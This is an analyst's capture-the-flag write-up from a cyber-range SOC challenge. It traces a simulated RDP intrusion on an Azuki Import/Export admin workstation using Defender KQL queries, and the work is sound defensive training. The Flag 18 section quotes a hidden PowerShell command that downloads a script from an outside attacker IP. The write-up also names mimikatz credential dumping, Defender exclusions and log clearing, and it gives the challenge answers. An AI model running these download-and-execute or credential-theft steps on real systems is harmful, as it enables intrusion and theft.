# SOC Incident Investigation – Azuki Import/Export Compromise

<img width="600" height="800" alt="image" src="https://github.com/user-attachments/assets/03da5fec-8f9b-4395-94f7-9b2d92a777c8" />

**Analyst:** Luka Groff

**Source:** Cyber Range SOC Challenge

**System:** AZUKI-SL (IT Admin Workstation)

---

## Overview
Azuki Import/Export Trading Co. suffered a targeted compromise leading to theft of supplier contracts and pricing data.
The attacker used stolen credentials for RDP access, staged malware, dumped credentials, exfiltrated data using a cloud service, and attempted cover-up.

---

## Key Findings

### Initial Access
- Vector: RDP (Valid Account)
- Source IP: 88.97.178.12
- Compromised User: `kenji.sato`

### Discovery
Network enumeration using: `ARP.EXE -a`

### Defense Evasion
- Staging directory: `C:\ProgramData\WindowsCache`
- Defender exclusions: 3 file extensions
- Defender excluded folder: `C:\Users\KENJI~1.SAT\AppData\Local\Temp`
- LOLBin used: `certutil.exe`

### Persistence
- Scheduled Task: `Windows Update Check`
- Task payload: `C:\ProgramData\WindowsCache\svchost.exe`
- Backdoor account created: `support`

### Credential Access
- Dump tool: `mm.exe`
- Module: `sekurlsa::logonpasswords`

### Collection & Exfiltration
- Archive: `export-data.zip`

### Exfiltration service: Discord
- C2 IP / Port: `78.141.196.6:443`

### Anti-Forensics
- First event log cleared: `Security`

### Lateral Movement Attempt
- Target IP: `10.1.0.188`
- Tool used: `mstsc.exe`

--- 

## Full Timeline

| Time (UTC) | Flag |	Stage	| Event / Artifact |
|------------|-------|-------|-----------------|
| 18:36:18 |	**Flag 1** |	Initial Access |	IP Identified → 88.97.178.12 |
| 18:36:18 |	**Flag 2** |	Initial Access |	User account → kenji.sato |
| 18:37:40 |	**Flag 18** |	Execution |	Malicious script Identified → wupdate.ps1 |
| 18:49:27 |	**Flag 5** |	Defence Evasion |	Number of file extensions excluded → 3 |
| 18:49:27 |	**Flag 6** |	Defence Evasion |	Temp folder exclusion → C:\Users\KENJI~1.SAT\AppData\Local\Temp |
| 19:04:01 |	**Flag 3** |	Discovery |	Network Recon Command → "ARP.EXE" -a |
| 19:05:33 |	**Flag 4** |	Defence Evasion |	Staging Directory → C:\ProgramData\WindowsCache |
| 19:06:58 |	**Flag 4** |	Defence Evasion |	Windows native binary used → certutil.exe |
| 19:07:46 |	**Flag 8** |	Persistence |	Scheduled Task Name → Windows Update Check |
| 19:07:46 |	**Flag 9** |	Persistence |	Executable path configured in the scheduled task → C:\ProgramData\WindowsCache\svchost.exe |
| 19:08:26 |	**Flag 12** |	Credential Access |	Filename of the credential dumping tool → mm.exe |
| 19:08:26 |	**Flag 13** |	Credential Access |	Module used to extract logon passwords → sekurlsa::logonpasswords |
| 19:08:58 |	**Flag 14** |	Collection |	Compressed archive filename used for data exfil → export-data.zip |
| 19:09:21 |	**Flag 15** |	Exfiltration |	Cloud service used for exfil → discord |
| 19:09:57 |	**Flag 17** |	Impact |	Backdoor account username created → support |
| 19:10:37 |	**Flag 19** |	Lateral Movement |	IP for lateral movement → 10.1.0.188 |
| 19:10:41 |	**Flag 20** |	Lateral Movement |	Remote access tool used → mstsc.exe |
| 19:11:04 |	**Flag 10** |	C2 |	IP used for C2 → 78.141.196.6 |
| 19:11:04 |	**Flag 11** |	C2 |	Port used for C2 → 443 |
| 19:11:39 |	**Flag 16** |	C2 |	First Windows event log cleared → Security |

---

## 🚩 Flag 1: INITIAL ACCESS - Remote Access Source

Answer: 88.97.178.12

Query used:
```
DeviceLogonEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where LogonType == "Network"
| where ActionType == "LogonSuccess"
| project Timestamp, AccountName, RemoteIP, LogonType, ActionType
```
I found evidence that there was an RDP connection from the IP of 88.97.178.12 which corelates to the timing of the malicious activity.

<img width="1694" height="284" alt="image" src="https://github.com/user-attachments/assets/f8892f86-abb8-4af5-9120-dcace5e285ff" />

---

## 🚩 Flag 2: INITIAL ACCESS - Compromised User Account

Answer: kenji.sato

As can be seen from the provided picture above, the AccountName that logged in with the RDP from 88.97.178.12 was kenji.sato.

---

## 🚩 Flag 3: DISCOVERY - Network Reconnaissance

Answer: "ARP.EXE" -a

Query used:
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine has_any ("powershell", "cmd") or InitiatingProcessCommandLine has_any ("powershell", "cmd")
| project Timestamp, ProcessCommandLine,InitiatingProcessCommandLine, AccountName, FolderPath
| where AccountName == "kenji.sato"
```
The command "ARP.EXE" -a can be seen in the logs, which displays the local ARP cache once executed. This indicates a discovery phase of the attack.

<img width="1630" height="340" alt="image" src="https://github.com/user-attachments/assets/b912a20e-24b8-4b8b-a571-d8344959a2bd" />

---

## 🚩Flag 4: DEFENCE EVASION - Malware Staging Directory

Answer: C:\ProgramData\WindowsCache

Query used:
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains "attrib"
| project Timestamp, FileName, FolderPath, ProcessCommandLine, InitiatingProcessCommandLine, AccountName
```
I looked for the attrib command as hinted in the assignment, and the result was the one log found. With this, I found the primary staging directory where malware was stored. 

<img width="1626" height="402" alt="image" src="https://github.com/user-attachments/assets/50a78503-c24a-4058-bc13-21d0c1c17cae" />

---

## 🚩 Flag 5: DEFENCE EVASION - File Extension Exclusions

Answer: 3

Query used:
```
DeviceRegistryEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
//| where InitiatingProcessAccountName == "kenji.sato"
| project Timestamp, RegistryKey, RegistryValueName, RegistryValueData, RegistryValueType
```

I found evidence in the registry events that three file extensions were excluded from Windows Defender, the .bat, .ps1 and .exe file extensions. This was made so that the executable malicious files go undetected by Windows Defender.

<img width="1588" height="204" alt="image" src="https://github.com/user-attachments/assets/0f549651-93bd-4924-886a-e04d591ff74e" />

---

## 🚩 Flag 6: DEFENCE EVASION - Temporary Folder Exclusion

Answer: C:\Users\KENJI~1.SAT\AppData\Local\Temp

The results from the previous flag also showed that the attacker excluded the C:\Users\KENJI~1.SAT\AppData\Local\Temp path from the Windows Defender.

<img width="1422" height="326" alt="image" src="https://github.com/user-attachments/assets/a66654f8-749a-4001-a293-9bd5d733a8d5" />

---

## 🚩 Flag 7: DEFENCE EVASION - Download Utility Abuse

Answer: certutil.exe

Query used:
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine has_any ("powershell", "cmd") or InitiatingProcessCommandLine has_any ("powershell", "cmd")
| project Timestamp, ProcessCommandLine,InitiatingProcessCommandLine, AccountName, FolderPath
| where AccountName == "kenji.sato"
```
The attacker used a built-in Windows tool, certutil.exe, to download his own malicious files from the internet.

<img width="1656" height="128" alt="image" src="https://github.com/user-attachments/assets/8a3b3614-57c8-4b1d-b5a5-e4e73c3ca247" />

---

## 🚩 Flag 8: PERSISTENCE - Scheduled Task Name

Answer: Windows Update Check

Query used:
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine has_any ("powershell", "cmd") or InitiatingProcessCommandLine has_any ("powershell", "cmd")
| project Timestamp, ProcessCommandLine,InitiatingProcessCommandLine, AccountName, FolderPath
| where AccountName == "kenji.sato"
```

From the same evidence logs, I noticed a scheduled task command which initially looks innocent since the task name is Windows Update Check. The attacker wanted to hide in plain sight but it is evident that the command came from the same malicious file as other commands, the wupdate.ps1.

<img width="1628" height="338" alt="image" src="https://github.com/user-attachments/assets/7e573bc1-f34c-4c8f-878d-923211f3556c" />

---

## 🚩 Flag 9: PERSISTENCE - Scheduled Task Target

Answer: C:\ProgramData\WindowsCache\svchost.exe

Another Scheduled Task was spotted, from the same malicious file, wupdate.ps1. This Schedule task creates the folder where the malware would later be stored.

<img width="2028" height="330" alt="image" src="https://github.com/user-attachments/assets/7bb12c91-60bd-4e54-8670-bf7e027d3a92" />

---

## 🚩 Flag 10 and 11 : COMMAND & CONTROL - C2 Server Address and Port

Answer: 78.141.196.6

Query used:
```
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where InitiatingProcessFileName == "svchost.exe"
| where InitiatingProcessAccountName == "kenji.sato"
| project Timestamp, RemoteIP, RemotePort, InitiatingProcessFileName
```

I noticed that the process svchost.exe that spawned with the scheduled task, made an outbound connection to 78.141.196.6 on port 443, so I'm assuming that it is the C2 server address.

<img width="688" height="264" alt="image" src="https://github.com/user-attachments/assets/7d700f0f-1628-46e5-a6f6-ed1d08c8a93e" />

---

## 🚩 Flag 12: CREDENTIAL ACCESS - Credential Theft Tool

Answer: mm.exe

Query used:
```
DeviceFileEvents
| where FolderPath contains "C:\\ProgramData\\WindowsCache"
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| project Timestamp, ActionType, FileName, FolderPath
```

I looked into the staging directory for the files created, and there were 3 malicious files, but the one necessary for the flag was the mm.exe, which is short for mimikatz, and it's a credential dumping tool.

<img width="1698" height="376" alt="image" src="https://github.com/user-attachments/assets/e8628aa7-3c4f-4316-9701-d7ebda65d538" />

---

## 🚩 Flag 13: CREDENTIAL ACCESS - Memory Extraction Module

Answer: sekurlsa::logonpasswords

Query used:
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains "mm.exe"
| project Timestamp, ProcessCommandLine,InitiatingProcessCommandLine, AccountName, FolderPath
| where AccountName == "kenji.sato"
```

Upon checking what the mm.exe does in the command line, I found the memory extraction module, sekurlsa, which extracts passwords from security subsystems

<img width="1626" height="330" alt="image" src="https://github.com/user-attachments/assets/c3b0ac10-b2ed-4742-8993-7cf96f09c2e2" />

---

## 🚩 Flag 14: COLLECTION - Data Staging Archive

Answer: export-data.zip

The answer to this flag has been seen before, when I checked for the files created in the attacker's staging directory.

<img width="1698" height="376" alt="image" src="https://github.com/user-attachments/assets/e8628aa7-3c4f-4316-9701-d7ebda65d538" />

---

## 🚩 Flag 15: EXFILTRATION - Exfiltration Channel

Answer: discord

Query used:
```
DeviceNetworkEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where InitiatingProcessAccountName == "kenji.sato"
| where RemoteUrl != ""
| project Timestamp, InitiatingProcessAccountName, RemoteUrl, RemoteIP, RemotePort, InitiatingProcessFileName
```
I checked for Network events created by the kenji.sato user and found that discord was used to exfiltrate data. 

<img width="660" height="392" alt="image" src="https://github.com/user-attachments/assets/a2d6ea36-f227-457f-a654-f27da5d86907" />

---

## 🚩 Flag 16: ANTI-FORENSICS - Log Tampering

Answer: Security

Query used:
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine contains "wevtutil"
| project Timestamp, ProcessCommandLine,InitiatingProcessCommandLine, AccountName, FolderPath
| where AccountName == "kenji.sato"
```

As per the hint, I checked for the commands of wevtutil, which was used to clear 3 different logs, Security, System, and Application, but the Security log was cleared first.

<img width="2346" height="276" alt="image" src="https://github.com/user-attachments/assets/4747cc46-f159-47b7-965a-7682dec4abf4" />

---

## 🚩 Flag 17: IMPACT - Persistence Account

Answer: support

Query used:
```
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-11-20))
| where ProcessCommandLine has_any ("powershell", "cmd") or InitiatingProcessCommandLine has_any ("powershell", "cmd")
| project Timestamp, ProcessCommandLine,InitiatingProcessCommandLine, AccountName, FolderPath
| where AccountName == "kenji.sato"
```

The attacker created another account called support as a persistence account as can be seen from the ProcessCommandLine logs made by the user kenji.sato.

<img width="1630" height="320" alt="image" src="https://github.com/user-attachments/assets/e064d549-b2f9-40f9-9ecc-da97242d7733" />

---

## 🚩 Flag 18: EXECUTION - Malicious Script

Answer: wupdate.ps1

I found the answer to this flag while finding the other flags. The first instance was when the attacker downloaded the file using the following command: powershell  -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'http://78.141.196.6:8080/wupdate.ps1' -OutFile 'C:\Users\KENJI~1.SAT\AppData\Local\Temp\wupdate.ps1' -UseBasicParsing". Later commands were all executed by the same PowerShell file, which contains a script.

---

## 🚩 Flag 19: LATERAL MOVEMENT - Secondary Target

Answer: 10.1.0.188

Two of the many commands that were executed by the wupdate.ps1 were "mstsc.exe" /v:10.1.0.188 and "cmdkey.exe" /generic:10.1.0.188 /user:fileadmin /pass:**********, which indicates that the attacker is preparing and launching a Remote Desktop (RDP) connection using stored credentials, likely for lateral movement.

<img width="1632" height="320" alt="image" src="https://github.com/user-attachments/assets/bfa6001e-2c7b-4901-8784-6167d2eee442" />


<img width="1628" height="316" alt="image" src="https://github.com/user-attachments/assets/a11f0c0b-fba8-4a3c-974a-275176bffb61" />

---

## 🚩 Flag 20: LATERAL MOVEMENT - Remote Access Tool

Answer: mstsc.exe

As can be seen in the previous flag, the tool used for remote access was mstsc.exe, which is not as well-known as RDP, but instead it's a Remote Desktop Client (Microsoft Terminal Services Client), which does the same thing, but can blend in easier.



